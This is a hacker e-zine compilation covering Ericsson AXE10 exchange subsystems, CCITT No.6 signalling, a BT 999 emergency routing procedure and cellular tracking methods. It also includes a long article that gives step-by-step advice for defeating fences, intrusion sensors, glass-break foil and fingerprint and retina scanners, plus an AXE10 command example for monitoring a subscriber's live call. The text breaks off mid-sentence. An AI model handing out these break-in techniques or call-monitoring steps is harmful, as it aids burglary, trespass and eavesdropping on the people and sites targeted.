Local AXE10 Exchange Subsystems
hybrid &lt;hybrid@f41th.com>
--------------------------------------------------------------------------



The AXE10 exchange is sometimes referred to as "System Y", and is
manufactured by Ericsson. It is modular in design and is therefore divided
into a number of subsystems. The following text describes the subsystems
in a local exchange and shows how they are interconnected. 

Basic Structure
===============

An AXE10 exchange can be split into three main parts. These are known as
APT, APZ, and IOG. As shown in the following diagram:


        +-------------------------------------------------------+
        :  .----------.     .----------.     .----------.       :

        :       | customer       |      __________|             :

        :       |                |     |                        :
        :.......|................|.....|........................:
        :       |                |     |       :    IOG         :
        :  .----|----------------|-----|----.  :  .-----.       :MM COMS
        :  |                                |  :  | I/O |-------:------->
        :  | APZ:       CONTROL           <-|--:--|->   |       :OMC
        :  |________________________________|  :  |_____|-------:------->
        :                                      :                :ALARMS
        :______________________________________:________________|
        
        (Basic Structure of an AXE10 Exchange)
        (IOG == Input Ouput Group)

Call switching, customer acces and junction access are all handled by the
APT, while control is the responsibility of the APZ. Input and output
connections to terminals, printers, alarms, storage devices, and data
links are all handled by the IOG. This is similar to a theoretical layout
of a System X exchange type.

Subsystems
==========

The three main parts are divided into a number of subsystems, as shown in
the following diagram:

        (AXE10 Subsystems)
        (APZ control is split into Regional Processing Subsystem (RPS),
         and the Central Processing Subsystem (CPS)).

APT contains the:
(APT Subsystems)
        
Subscriber Switching Subsystem (SSS) to provide customer access
===============================================================
The SSS has the same function as the DSSS in System X and concentrates
customers lines into a number of digital (PCM) links. It can be sited in
an AXE10 exchange where it is called a Local Subscriber Switch (LSS) or in
a remote location where it is called a Remote Subscriber Switch (RSS). As
with System X remote concentrators (RCUs), the collection of RSSs on one
site is called a Remote Concentrator Centre (RCC).

Trunk and Signalling Subsystem (TSS) which deals with junction access
=====================================================================
TSS handles the connections to other exchanges. Its main job is to match
the AXE10 exchange to various junction signalling systems. It is similar
in function to the SIS subsystem in System X.

Group Switching Subsystem (GSS) which handles switching
=======================================================
GSS is the heart of the switching system and is responsible for connecting
and supervising speech paths, it is similar to the DSS in a System X
exchange.

Common Channel Subsystem (CCS) which handles CCITT No 7 (C7) signalling
=======================================================================
This subsystem handles the common channel signalling messages between the
AXE10 and other exchanges. It is similar in function to the MTS in System
X exchanges.


APZ Subsystems
==============

Regional Processor Subsystem (RPS)
==================================
RPS consists of a number of Regional Processors (RPs). These processors
perform simple, routine, high capacity tasks, such as scanning of
subscribers lines and the operation of switches. The regional processors
are usually mounted next to the equipment they are serving and so are
spread around the exhange equipment.

Central Processor Subsystem (CPS)
=================================
CPS contains two processors (CPs) which carry out all the complex
processing needed to control the AXE10 exchange. The duplication of
central processors is necessary for system security. It is similar in
function to the PUS subsystem in System X.


IOG Subsystems
==============

Support processor Subsystem (SPS)
=================================
This subsystem supervises the operation of all IOF functions.

Man-machine Communication Subsystems (MCS)
==========================================
This subsystem handles communications between input/output devices and the
rest if the AXE10 exchange. These devices can be visial display terminals,
printers, or alarm panels.

Data Communications Subsystem (DCS)
===================================
This subsystem handles communications over digital links e.g. (in the UK:
OMC etc). MCS and DCS have approximately the same function as the AUS and
NIS subsystems in System X.

File Managment Subsystem (FMS)
==============================
All mass storage devices (backing stores) are connected via the FMS
subsystem. These devices can take the form of tapes, floppy disks and hard
disks. In System X this function is part of the PUS subsystem.


What an AXE10 Exchange l00ks like
=================================

Inside a typical AXE10 exchange will be rows of cabinets containing 1 
or 2 AXE10 Central Processor Racks (containing mounted magazines, cards
and cables). 1 or 2 IOG11 cabinets (narrow looking cabinets with just 1
door).


Deployment
==========

Most of Greece, especially populated areas such as Athens is served by
AXE10 and System Y subsystems. In the UK there are ISCs (International
Switching Centres) which handle traffic to and from other countries, such
as: Keybridge, Kelvin, Madley which are using AXE10 for international
trunking and supervision.

Managment
=========

AXE10 MCS Man Machine Interfaces control the functionality of the AXE10
system. To list every "function" that is available in the Ericsson AXE10
command line would take forever, just for a tase of what these commands
look like, here is an example of a MONITORING command line descrition.

MONITORING, INITIATE
====================
                 
                 +         +         + +
      +        + | DEV=dev | BCH=bch | |        // command format.
MONTI:|BNB=bnb,| +         +'        + +;
      +        + | SNB=snb             |        
                 +                     +

// parameters

BCH=bch         B-channel identity. Numeral with value 1-30. Used to
                initiate monitoring on a specific B-channel at
                applications where one device corresponds to one access.

BNB=bnb         B-number for listening or speech connection to test
                position. Digit string 1-16 digits where each digit is
                0-9 or #10-#15.

DEV=dev         Device designation. Expressed as dety-n where dety: a
                device type identfier 1-7 characters (system defined) n:
                Numeral 0-65535. The maximum value is defined by SAE=500
                in the block which ownz the device. Alternate expressions
                can be found in the appliocation information for block
                TRAN and the concerned device block.

SNB=snb         Subscriber number. Digit string 1-12 digits where each
                digit is 0-9 or #10-#15. The maximum number of digits can
                be found in the application information for block TRAN.

Dialogue Parameters
===================

CON;            Executes trunk offering of the monitored object. This
                cannot be given if offering with speech facility has 
                already been executed.

END;            Disconnects the monitoring function and terminates the
                dialogue command.

NXT;            Initiates monitoring of the next channel of the monitored
                object. This can only be used if there is more than one
                channel for the monitored object and where BCH has not
                been specified. It may only be given after a monitoring 
                connection has been established.

SON;            Executes trunk offering with speech facility of the
                monitored object.

The function
============

In dialouge with the function, the command orders trunk offering in GS for
monitoring of an ESTABLISHED CALL. The command can only be ordered and
executed from a defined test position in the exchange.  The function is
able to handle monitoring of successive channels of ISDN subscriber lines
with more than one channel. Trunk offering is not permitted for certain
subscriber catigories.

In applications where one device corresponds to one primary rate access,
it is possbile to innitiate monitoring of a specific B-channel by the
paremter BCH. If paremeter BCH is not specified then monitoring is
performed on the first busy channel. 

If the operator wishes to enter the line with conversation about the
monitored call, this can be done with the paremter SON, in which case the
printout SPEECH MONITORING ESTABLISHED will be recieved. 

Monitoring of subscriber number 9900220: (example)

        (<)MONTI:SNB=9900220;
        (READY FOR CONNECTION)
        (:) CON;
        (CONNECTION ESTABLISED)
        (:) SON;
        (SPEECH MONITORING ESTABLISHED)
        (:) END;
        (CONCLUSION OF COMMAND MONTI)

Bypassing physical securtity.
by Tophat
The High Class Hooligan
[ http://www.mobsters.net ]
--------------------------------------------------------------------------

In this day and age many people are well versed in network breaching. Many 
times a computer and a telephone line is all it takes to "get in". But for 
old times sake, this textfile will discuss many ways of avoiding, and even 
bypassing, physical security systems. 

Note: This t-file is composed greatly of information gathered from the 
LOD/H Technical Journal "Identifying, Attacking, Defeating, and Bypassing 
Physical Security and Intrusion Detection Systems" written by Lex Luthor. 
This file will be an update to that file, parts of that file will be 
incorporated into this file, and all things that have changed and/or 
recently come about will be mentioned in the file as well.

Fences
------
*Barbed wire fences*
Barbed wire fences, short of plain chain link fences, are the most common 
forms of physical security. One form of barbed wire has thee barbs places 
approx. 6-8" apart, leaving plenty of room for hand or foot. This type of 
wire usually consists of 2-3 strands of metal and can thus be cut quite 
easily. The other common form of barbed wire is "razor ribbon". This is 
wire strung out in a circlie over the top of a fence with razor sharp barbs 
in it. Attempting to climb over this is difficult because the wire is in a 
circle and cannot support any weight without collapsing upon itself and 
cutting someone. It is also unwise to cut since it will unroll and spring 
back once it is cut...not to mention being terribly obvious. However, I 
have seen a person climb it without getting cut, but that takes time, 
strength, and finesse..things which can not be taught in a t-file ;)  
Many times a tough material such as leather or, as I have found to work 
well, old carpet scraps, can be thrown over the razor ribbon making a 
safe passage possible.

*Electric Fences*
Sound scary don't they? These are mainly used in very high security 
facilities (such as prisons), and on cattle farms. Obviously the voltage is 
quite different for either. Contrary to what movies would have you believe, 
touching an electric will not fry you. The voltage is so varied that stating 
an exact voltage would be nothing more than a gamble. The fence is part of 
circuit that has enought current running through to make it very 
uncomfortable. This is very similar to those Invisible dog fences The current 
in the fence doesn't wound the dog, but it is certainly enough to deter the 
dog from trying to pass it. One way to get past the fence is top quite simply 
jump over it. If you touch the fence, but don't touch anythnig else (i.e. 
ground, poles, etc..) you will not feel the shock. Your body is just becoming 
part of the circuit. Using this method you could run and jump placing your 
foot on the fence and pushing off with the same foot. Now of course, hardly 
any of these fences will be short enough to jump over. Another way is to cut 
the fence. There are tools out there designed specifically to cut electric 
fences. These tools are made of synthetic metals that do not conduct 
electricty. I have purchasesd a synthetic knife that when used properly
with its scrabbard it able to cut eletric fences with out discomfort.  I 
purchased this knife from 'Smoky Mountain Knife Works' 
(www.smokymountainknife.com). You can also purchase synthetic bolt cutters 
from a major hardware store. The downside of this method is that it leaves 
visible evidence of intrusion.

Fence mounted sensors
---------------------
*shock sensors*
These mount on fence posts at intervals of 10 to 20 feet, or on every post. 
They are small boxes clamped about 2/3 up from ground level. There is a 
cable, either twisted pair or coax running horizontally across the fence  
connecting these boxes. The cable can be concealed in conduits or inside 
the fence itself, thus, making it hard to visually detect. Each fence sensor 
consists of a seismic shock sensor that detects climbing over, lifting
up or cutting through the fence. There is also something called "E-Flex
cable". This cable can not only be used on chain linkfences, but can also be 
used on concrete block, brick, or other solid barriers. It may be on the
outside, or mounted inside the fence, thus, making detection of the device  
harder. Of course detection of this and other similar devices which cannot 
be seen, doesn't make it impossible. There are also forms of this sensor 
that are microphones. These just pick up noise transmitted along the fence 
itself. These are pretty uncommom since noise along the fence is not an 
uncommon occurance.

*vibration sensors*
These are pretty much the same thing, only constrcuted different. Although
this sounds extremely ghetto, a good way to test for hidden sensors is to 
play around with the fence. Throw rocks, sticks, whatever at it. Then hide 
and watch. Not only do you get to see what kind of security system they have, 
but you also get a chance to see how long it takes them to respond.

Security lighting and Video Cameras
-----------------------------------

*CCTV*
Sometimes, fences may be backed up by Closed Circuit Television (CCTV) 
systems to make visual monitoring of the perimeter easier and quicker. By
installing an adequate lighting system and conventional CCTV cameras, or
by using special low light sensitive cameras (infared and night vision),
the perimeter can be monitored from a central point. Security personnel 
can then be dispatched when an intruder is seen on the monitors.

Cameras can either stationary or movable. Starionary cameras are in a fixed 
position monitoring one spot. These cameras are set higher up to give a 
greater viewing field. Movable cameras can be either remotely controlled by 
a keypad or joystick, or are programmed to move after a given time delay.  
Since these cameras are usually set upon a wall they can not rotate the full 
360 degrees. To get a larger turning radius movable cameras are usually 
bolted to a corner of a wall, thus giving more room to turn. A Moveable 
camera post on top of a pole can ger clost to a 360 degree radius. The best 
way to avoid cameras is to find out if a camera is movable or not, and how 
long the time intervals between each movement is if the camera is moveable.  
The plan your path accordingly: walk against walls, fences, directly under 
cameras, etc..

*Light control sensor*
This utilizes a Passive InfraRed (PIR) sensor to detect the body heat
emitted from someone entering the detection area, and can activate a light
or other alarm. The sensor has an option called: 'night only mode' in which 
a light will flash when a person enters the area, but only during night 
hours. It can tell if its dark by either a photoelectric sensor, or by a
clock. Of course if its daylight savings time, the clock may not be totally 
accurate, which can be used to your advantage. If it is photoelectric, you  
can simply place a flashlight pointing directly into the sensor during 
daylight hours. When it gets dark, the photoelectric sensor will still 
'think' its day since there is sufficient light, thus, not activating the 
unit to detect alarm conditions. These sensors are incased insmall metal 
boxes, about 6x4 inches, the sensor itself is behind a dark colored glass 
plate, about an inch or two square. These sensors can also be taped over to 
trick the alarm/light into staying active. This can be useful if you need 
to create a diversion of some sort.

Buried Seismic Sensors
----------------------

Seismic detectors are designed to identify an intruder by picking up the  
sound of your footsteps or other noises related to passing through the 
protected area. These sensors have a range of about 20 feet and are buried  
underground and linked by a cable, which carries the signals to a processor. 
There, the signals are amplified and equalized to eliminate frequencies 
that are unrelated to intruder motion (like a human compared to animal). 
The signals are converted to pulses that are compared with a standard signal 
threshold. Each pulse that crosses this threshold is tested on count and 
frequency. If it meets all the criteria for a footstep, an alarm is 
triggered. These sensors can even be installed under asphalt or concrete by
cutting a trench through the hard surface. It is also immune to weather and 
can follow any type of terrain. The only restriction is that the area of  
detection must be free of any type of obstruction such as a tree or a bush. 
A clever way to confuse the system is to use abnormal methods of entry.  
Bicycles, rollerblades, etc., will not register the same as footsteps would.

Electronic field sensor
-----------------------

These detect an intruder by measuring a change in an electric field. The 
field sensors use a set of two cables, one with holes cut into the cable 
shielding to allow the electromagnetic field to 'leak' into the surrounding 
area. The other cable is a receiver to detect the field and any changes in 
it. Objects passing through the field distort it, triggering an alarm. This 
sensor can either be buried or free standing, and can follow any type of 
terrain. But its very sensitive to animals, birds, or wind blown debris,
thus, if it is very windy out, and you know this is being used, you can get  
some paper and throw it so the wind takes it and sets off the alarm 
repeatedly. If it is done enough, they may temporarily turn it off, or ignore 
it due to excessive false alarms.

It is not hard to tell if these devices are in use. You cannot see them, but 
you don't have to. Simply get 3-4 medium  sized stones. Throw them into the 
place where you think the protected area is. Repeat this several times. This 
works on the lesser advanced systems that have trouble distinguishing this 
type of seismic activity from human walking/running. If nothing happens, you 
can be reasonably sure this is not in use. Now that you can detect it, how do
you defeat it? Well as far as the electronic field sensor is concerned, you 
should wait for a windy night and cause excessive false alarms and hope
they will turn it off. As far as the seismic sensors, you can take it one 
step at a time, very softly, maybe one step every 30-60 seconds. These 
sensors have a threshold, say, two or more consecutive footsteps in a 30 
second time interval will trigger the alarm. Simply take in one step at a 
time, slowly, and wait, then take another step, wait, until you reach your 
destination. These detectors work on the assumption that the intruder has
no knowledge of the device, and will walk/run across the protected area 
normally, thus, causing considerable seismic vibrations. The problem with 
this method is that it will take you some time to pass through the protected 
area. This means there is more of a chance that you will be seen. If there 
are a lot of people going in and out of the facility, you may not want to 
use this method. Another way would be to run across the protected area,
right next to the door, (assuming that is where the response team will come 
out) and drop a large cat or a dog there. When they come out, they will 
hopefully blame the alarm on the animal. The sensor shouldn't really pick  
up a smaller animal, but odds  are the security force are contract guards 
who wouldn't know the capabilities of the device and the blame would fall 
on the animal and not you.


Microwave systems
-----------------

In an outdoor microwave system, a beam of microwave energy is sent from a 
transmitter to a receiver in a conical pattern. Unlike indoor microwave 
detectors, which detect an intruders' movement in the microwave field, the 
outdoor system reacts to an intruders' presence by detecting the decrease  
in energy in the beam. The beams can protect an area up to 1500 feet long 
and 40 feet wide. All transmission is line-of-sight and the area between  
transmitter and receiver should be kept clear of trees and other objects 
that can block the beam. Microwave systems can operate in  bad weather, 
and won't signal an alarm due to birds or flying debris.

These systems work on the Doppler effect, in which they detect motion that 
changes the energy, and sets off an alarm. These devices will usually be 
placed inside a fence to avoid false alarms. These devices are very easy to 
visually detect. They are posts from 1-2 yards high, about 6 inches by
6 inches and there are 2 of them, one receiver and one transmitter. In some 
cases there will be more, which enables them to protect a larger area.

To defeat this, you can enter the field, very slowly, taking one step at a 
time but each step should be like you are in slow motion. It doesn't matter 
how hard you hit the ground, since it doesn't detect seismic activity, only 
how fast you approach the field. If you take it very slowly you may be able 
to get past. Detectors of this type get more and more sensitive as you 
approach the posts. Ergo, choose a path which will lead you furthest away 
from the posts. These systems are very rare, and have since started to 
become outdated.


Photoelectric systems
---------------------

These systems rely on an invisible barrier created by beams of infrared 
light sent from a light source to a receiver. When the beam is interrupted, 
the alarm sounds. The beam can have a effective range of up to 500 feet. 
Multiple beams can be used to increase the effectiveness of the system, 
making it harder for you to climb over or crawl under the beams. 
Photoelectric systems can be prone to false alarms as a result of birds or 
wind-blown debris passing through the beam. The problem can be corrected by  
the installation of a circuit that requires the beam to be broken for a
specified amount of time before an alarm is sounded. Weather conditions 
like heavy fog, can also interrupt the beam and cause an alarm. This can 
also be corrected by a circuit that reacts to gradual signal loss. These 
systems will not face directly into the rising or setting sun since this 
also cuts off the signal beam.

As you can see this system has many problems which you can take advantage of
to bypass this system. As with any system and method, surveillance of the 
facility should be accomplished in various weather conditions to help verify
the existence of a particular detection device, and to see how they react to 
false alarms. Many times, you will be able to take advantage of various  
conditions to accomplish your mission. If there is only one set of devices 
(transmitter and receiver), try to estimate the distance of the sensors from 
the ground. You can then either crawl under or jump over the beam. This
also works on the assumption that the intruder will not recognize that the
device is in use.

Temperature Monitoring systems
------------------------------

One popular type of alarm is a device that monitors temperature in a area.  
Since it measures temperature it does not have a given radius of effect.  
Thus they can monitor large areas with just a single unit. These systems can 
be either programmed with the room temperature, such as in a computer lab 
where the temperature is always a certain degree, or they have be set to 
adjust to the room temperature. These work by sensing a distrubance in the 
temperature and then alerting an alram. These can detect a heat increase of 
a human walking as well as a decrease (or increase maybe) in temperature 
caused by a door being opend or window being broken. These changes in 
temperature occur very swiftly. In order to fool the system it would be 
possible to change the tempetature very slowly do the desired temperature.  
One way to do this would be instead of breaking the window, to drill a hole 
in it and very slowly leak outside air in. If done slow enough, you can get 
the room temperature to equal outside temperature without sounding the alarm. 
This method will not work if the temperature is programmed to a certain 
degree.

Foil tape:
----------

This is by far the most common, and probably the most improperly installed 
form of glass breakage detection, which also makes it the most insecure.
This is usually a silver foil tape about 5/16" wide which should be placed
on the whole perimeter of a glass window or door. In the case of
plexyglass or a similar material, the tape should be placed in rows
separated by 6-12 inches.

The older foil was covered with a coating of eurathane or epoxy which enabled
it to stick onto the glass. The newer foil has an adhesive back making
installation much easier. There should be two connectors which are located at
the upper top part of a window, and the lower part of the window which connects
the foil to the processor, thus, completing the circuit. Foil may or may not
have a supervised loop. If it is supervised, and you use a key to scratch the
foil (when it is turned off) making a complete break in it, an alarm will sound
when it is turned on.

Foil is commonly used as a visual deterrent. Many times, it will not even be
activated. The easiest way to determine if the facility is trying to 'B.S.' you
into thinking they have a security system, is to see if there are any breaks
in the foil. If there is a clean break, the 6-12V DC current which is normally
making a loop isn't. Thus, breaking the glass will do nothing other than make
some noise unless you take steps against that happening.

As was stated, foil is the most improperly installed type of glass breakage
detection. When it is installed improperly, it will not cover all the area it
should. Often the installer neglects to place the foil all the way down to
the bottom of the glass door. There is enough room for a person to climb
through. They may have thought that if someone broke the glass, it would all
break, which is normally correct. But if you obtain some strong contact paper,
preferably clear, adhere it to the glass =, and break the bottom part at
the it will break up to the edge. Thus, leaving the foil in-tact. This will 
work on tempered glass the best, and will not work on Lexan or Plexyglass. 
There is a transparent window film with a break strength of up to 100 pounds 
per square inch which can be obtained from Madico, Inc. It is called, Protekt 
LCL-400 XSR, and makes glass harder to break and stays essentially in
place even when broken. This can be used in place of the contact
paper. Obviously, it is also used to protect glass from breakage.

Types of Security Windows
---------------------------

Plate glass: Can be cut with a glass cutter.
Tempered: Normally can't be cut. Breaks up into little pieces when broken.
Safety: You need a hatchet to break this stuff.
Wire: This has wire criss-crossed inside of the glass, making it very hard to
break, and even harder to actually go through the opening it is in place of.
Plexy: Very hard to break, doesn't really shatter, but can be melted with the
use of a torch.
Lexan: This is used in bulletproof glass. One of the strongest and most secure
types of glass.
Herculite: Similar to Lexan.
Glass Bricks: The thick blocks of glass you seen in lots of 50s type 
resturants. These are very hard to break, but they are held together by a 
strong poxy which can be dissolved. They then can be pushed out of place.


Fingerprint Scanners
---------------------
These are often located on the interior of buildings but are sometimes used 
at entryways as well. Fingerprint systems scan in the print of person and
then run it against a database of fingerprints that belong to allowed 
personnel. The most common method to bypass this is to use the fingerprint of 
the previous person who entered. The scanner is made out of a darkglass that 
oils and dirt from a finger easily stick to. If you can completely cover up 
your finger, and make it smooth (with say, a rubber glove), you can press 
firmly on the glass which will then scan the remains of the previous 
fingerprint. The scanners cannot always recieve a difinite fingerprint and 
thus scan for the major identifications (crest, pattern, etc..). Because of 
this, what remains from the previous fingerprint is usually enough 
information to allow passage.

Retina Scanners
-----------------
This is bascially the same concept as above. The scanner checks the scan it 
recieves against a database of previously scanned personnel. I have never 
tried, or heard of way to defeat this system without disabling it. But in 
theory, if a person were to obtain a retina scan from the allowed database, 
s/he could then have eye contacts made with that pattern. The contacts would 
have to have a black finish on the inside of the contact thus to give it a 
uniform background. The scanner would then read the pattern of the contact 
and grant access. If anyone has the facilites to test this out, please, let 
me know.

I'm srating to see what a large file this is turning out to be. There is 
still tons of information left (keypad locks, card slots, wireless 
transmitters, etc..), so much that I will have to make at least a part II 
to this file. I will wait and see what kind of response this file gets.

--------------------------------------------------------------------------



Signalling System CCITT NO.6 is a system for common channel signalling
over international circuits. This means that the signalling takes place
over a signalling link that is seperate from the speech circuits. Thus a
great number of speech circuits can be controlled by only one signalling
link. This system can be used over all types of international circuits,
including TASI and satellite circuits.

The main features of CCITT NO.6. are as follows.

===========================================================================
-  The system is intended for use  on bothway trunk
   circuits with a possibility of both analogue and
   PCM transmission.
===========================================================================
-  The call control  information includes parameters
   for terminal / transit indication, satellite circuits,
   echo suppressor function , and information on the
   category of the calling party.
===========================================================================
-  Capacity for up to 2048 speech circuits, controlled by
   one signalling link.
===========================================================================
-  Continuity check of speech path using a continuity tone.

BT Operator 999 Emergency Call Routing Procedure.
D4RKCYDE &lt;http://f41th.com>
hybrid/psyclone/grip.




-----------------------------------------------------------------------------
ROUTING 999 EMERGENCY CALLS VIA NUMBER RANGE
-D4RKCYDE
-----------------------------------------------------------------------------


The BT Operator will receive an Emergency Call originating from an 
OPERATOR number. An onscreen indicator will alert the BT Operator that the
Call has originated from an OPERATOR number. A full Calling Line Identity
(CLI) will be shown.

The National Number Group (NNG) and D,E or F digits, as appropriate, will
generate the appropriate Emergency Organisation connect to numbers. The
Call will be answered and connected following BT standard operating
procedures.
   
NAME AND ADDRESS CHECKS
-----------------------

Obtaining name and address information in the event of a request from the
Emergency Organisations in connection with an Emergency Call. During or
after an Emergency Call the Emergency Organisation Operator may ask the
BT Operator to determine the name and address associated with the caller's
'phone number. This will be achieved by the BT Operator contacting a
staffed name and address enquiry point at the OPERATOR's premises. Name
and Address Enquiry Point

The OPERATOR will provide BT with a direct, fixed line, 24 hour enquiry
point. There should be more than one number for resilience. The OPERATOR
will attempt to answercalls within 15 seconds and provide the name and
address within a maximum of 30 seconds from the BT Operator calling the
number. In the event of the BT Operator being asked to provide a name and
address by the Emergency Organisation the BT Operator will 'phone through
to the name and address enquiry point at the OPERATOR's operations centre.
   
The OPERATOR's operations centre will give priority of answer to these 
calls. The BT Operator will identify themselves, quote the CLI number and
ask for a name and address associated with the number. The OPERATOR's
operator will relay over the 'phone the name and address.
   
The OPERATOR must quote the installation address associated with the 
number, not the billing address. The OPERATOR will be responsible for the
accuracy of the information on the database. The BT Operator will pass the
details back to the Emergency Organisation.
   
Online Access If available, the BT Operator will access the OPERATOR's
customer records database directly to obtain the name and address. The
address shown to the BT Operator must be the installation address. There
must be a 24hr staffed contact point which the BT Operator can access in
the event of a failure of the online system.

ROUTING 999 EMERGENCY CALLS VIA CUSTOMER'S POSTCODE
---------------------------------------------------

The BT Operator will receive an Emergency Call originating from an 
OPERATOR number. An onscreen indicator will alert the BT Operator that the
call has originated from an OPERATOR number. A full calling Line Identity
(CLI) and full customer's name and address will be shown. Based on the
customer's postal code, will generate the Emergency Organisation connect-
to numbers. The call will be answered and connected following BT standard
operating procedures.

EMERGENCY CALL ROUTING - VIA NUMBER RANGE
-----------------------------------------

Definition: The method by which it is determined which Emergency
Organisation control room a Customer is connected to in the event of an
Emergency Call, via the customers' telephone number, (the full Calling
Line Identity).
   
Background: When an Emergency Call is presented to a BT Operator the CLI
generates the appropriate list of connect to numbers for Fire, Police,
Ambulance, Coastguard and Mountain Rescue. Historically, for BT Customers,
this has required overlaying the Emergency Organisation boundaries onto BT
exchange boundaries. In cases where an Emergency Organisation boundary
cuts through a BT exchange boundary there are two solutions. By mutual
agreement one or other neighbouring Emergency Organisation will agree to
take all the Emergency Calls within the BT exchange boundary and therefore
the routing is determined by NNG alone. This is practical where only a
small proportion of the BT exchange boundary lies within an Emergency
Organisation boundary. Alternatively the traffic is split by using D, E or
even F digit discrimination. In this case BTOSS is programmed to examine
the CLI down to the relevant digit and generate the correct Emergency
Organisation listing page.

Out of Area Numbers
-------------------

If the OPERATOR offers out of area numbering schemes to its Customers
(usually business PBXs) then they should ensure that Emergency Calls are
routed out on an appropriate local geographical number so that when the
call is presented to the BT Operator a correct local number is displayed.
   
Geographic Routings
-------------------
   
It will be necessary to cross reference the OPERATOR's boundaries with BT
exchange boundaries and the Emergency Organisation boundaries. The
OPERATOR must provide BT with a map showing theboundary for each area of
coverage. This mustbe on an Ordnance Survey map to the scale of 1:50000.
The responsibility for the accuracy of the boundaries lies with the
OPERATOR. If necessary, the ESM(see below) will assist in the preparation
of a map.
   
Where the OPERATOR has no defined boundary the OPERATOR will need to 
follow the appropriate National Number Group (NNG) boundary. e.g. if the
OPERATOR has been allocated a DE range from the 0113 NNG they will need to
follow the 0113 NNG boundary. BT will provide an overlay with the NNG
boundary and BT local exchange boundaries. The OPERATOR will be 
responsible for allocating number blocks down to "F" digit to align with
BT exchange boundaries. The numbering scheme will need to be shared with
BT so that the call routing plan can be loaded onto the call handling
system.
   
When completed, a list showing which number ranges have been allocated to
each local exchange area should be sent to the BT Operator Services 
Marketing Support Manager (O&M) who will be responsible for ensuring that
call routing tables are built. This information should be provided two
months prior to BIS date.

New Number Ranges
-----------------

If the OPERATOR applies for new number ranges then consideration must be
given by the OPERATOR to 999 planning. If the OPERATOR has only been
operating part of the operational area and has applied for new number
ranges to expand operations to new parts of the operational area then the
process described above will need to be repeated. OS will require a
minimum of four months notice.
 
ROLE OF EMERGENCY SERVICES LIAISON MANAGER
------------------------------------------

BT will provide the services of an Emergency Services Manager (ESM) to
support the OPERATOR in the initial provision of Emergency Service and to
provide ongoing liaison between the OPERATOR and the Emergency 
Organisations. The ESM will not be dedicated to the OPERATOR but will
also serve BT Customers.

Implementation - General Tasks
------------------------------

The ESM will be responsible for planning the routings of Emergency Calls
from the OPERATOR's Customers to the relevant Emergency Organisation
control rooms.

Ongoing Liaison
---------------

The ESM will act as the interface between the OPERATOR and the Emergency
Organisations to provide the same liaison functions as for BT and its
Customers. The ESM will work in conjunction with the OPERATOR's Customer
Services to resolve any difficulties or queries arising from the provision
of Emergency Service. These functions will include:-

i)      Working with the OPERATOR's Customer Services to resolve Emergency
        Call complaints.
ii)     Answering general enquiries from the OPERATOR about the Emergency
        Call Service, for example, quality of service issues.
iii)    Ensuring that any changes to the OPERATOR's area are reflected in
        the routing plan and Emergency Organisation listing pages are revised
        accordingly.
iv)     Assisting Emergency Organisations with queries about Emergency
        Calls originating from the OPERATOR's System.

Home Office Liaison
-------------------

BT will not be responsible for liaison between the OPERATOR and the Home
Office about Emergency Call issues.

COMPLAINT PROCESS
-----------------

Complaints by Customers about the Emergency Call service will be received
by the BT Operator Assistance Centre, BT Service Management Centre (SMC)
or by the OPERATOR's Customer Services.

Complaints Received by an Operator Assistance Centre
----------------------------------------------------

Complaints will be handled in accordance with the BT Complaint Handling
process with appropriate liaisonwith the OPERATOR's Customer Services.

Complaints Received by the OPERATOR's Customer Services
-------------------------------------------------------

If the OPERATOR's Customer Services receive a Customer complaint about an
Emergency Call they should contact the ESM for assistance to investigate
the complaint. The ESM will require the originating number of the Call,
the Time and Date and the nature of the complaint. For example, if the
alleged complaint is about a long time to answer by BT then the ESM will
examine the tape or dockets as appropriate and report back to the
OPERATOR's Customer Services whether the fault is with BT or the Emergency
Organisation. If the OPERATOR requests access to an Emergency Call tape in
connection with a Customer complaint they should contact the ESM. This
will either be provided in the form of a transcript or a tape recording.
The ESM will determine which format is most appropriate e.g. a transcript
if the recording is very faint. It is recommended that if a recording or
transcript is provided that the ESM should discuss the contents with the
OPERATOR's Customer Services as the correct interpretation of tapes or
transcripts requires some expertise.

Police Investigations
---------------------

If copies/transcripts/access to the tapes are required by the Police for
the investigation of crime then existing BT procedures will apply and the
request will be handled by the ESM.

Cellular Tracking More Indepth                        
by Tradeser &lt;tollphree.com>
------------------------------------------------------------------------------

                  

After releasing my text on Methods Used To Track Cellular 
Phones in F41th 12, I was kinda dissapointed on how I didn't
go more indepth on how each tracking method works. This led
me on to a venture to find more information about cellular
tracking. For all of you that don't know, my summer job 
before college was working for a wireless provider in my 
area. This gave me access to a large database of information,
yet getting it would prove hard. After making numerous calls
to our wireless fraud depatment, some information on Measure
Angle Of Arrival and Measuring Time Difference Of Arrival was
faxed to my work place. I have typed up what they sent me. 


[.Snip.]

Measure Angle Of Arrival

Another technique that uses existing mobile device signals to
estimate location is known as angle of arrival or direction 
finding. Angle of arrival has been well developed among 
military and government organizations since it operates with
no modification to mobile devices. The technique requires a 
complex antenna array  an arrangement of several antennae 
in a precise, fixed pattern  at cell site locations. Antenna
arrays, in principle, work together to determine the angle 
(relative to the cell site) from which a mobile signal 
originated. When angles of arrival are computed for several 
cell sites, the mobile units location can be estimated based 
on the point of intersection of projected lines drawn out 
from the cell sites at the angle from which the signal 
originated. An angle of arrival system can perform well 
when tracking a continuous transmission, such as a voice 
transmission. The system must follow each voice channel 
assignment as a caller moves from cell to cell, and the call
is handed off from channel to channel. This can be difficult
if the angle of arrival antennae are not positioned to 
interpret the in-band voice channel signaling. It is more 
difficult to use angle of arrival to compute the location 
of a mobile unit emitting brief (one-tenth of one second) 
reverse control transmissions. It may also be difficult to 
use angle of arrival based on digital voice channel 
transmissions and data transmissions because of the brevity 
of the signals and the channel sharing that exists. Another 
significant drawback to angle of arrival systems is the 
logistical and aesthetic dilemma of adding antenna arrays 
(that can number from four to 12, depending on the angular 
resolution required) to cell sites at a time when communities 
are enacting increasingly harsh zoning regulations. Also the 
accuracy of angle of arrival systems is reduced as a mobile 
unit moves away from a cell site. To illustrate this problem, 
think of cutting a triangular pizza slice. The transmitter is 
moving away from the tip of the slice. As it moves farther away, 
the ambiguity (or width) of the pizza slice becomes greater even 
though the angle of the cut remains constant. Angle of arrival 
also is extremely sensitive to wide angle reflections (known 
as multipath reflections) that occur when a mobile devices 
transmissions reflect off natural and man-made structures, 
particularly buildings and mountains. These reflections can 
have power stronger than the direct path taken by the signal 
from the mobile unit to the antenna array. These multipath 
reflections can trick an antenna array into calculating an 
incorrect angle. For this reason, continuous reverse voice 
channel transmissions are more desirable than brief reverse 
control channel transmissions for angle of arrival systems 
because continuous reverse voice transmissions give angle of 
arrival systems time to attempt to resolve ambiguities due to 
multipath reflections. Angle of arrival technology may lend 
itself to the future use of smart antennae, which are compact 
